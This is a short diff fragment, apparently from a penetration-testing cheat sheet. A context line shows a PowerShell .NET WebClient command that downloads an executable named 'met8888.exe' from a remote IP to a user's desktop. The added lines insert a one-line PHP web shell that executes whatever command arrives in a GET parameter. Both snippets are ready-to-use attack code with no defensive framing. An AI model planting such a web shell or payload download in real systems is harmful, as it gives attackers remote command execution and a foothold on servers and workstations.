@@ -83,7 +83,10 @@ s.close()
 .NET object to download a remote file:  
 
 (new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')  
+****PHP***  
+Small Web shell:  
 
+<?php system ($_GET[“cmd”]); ?>
 
 
 
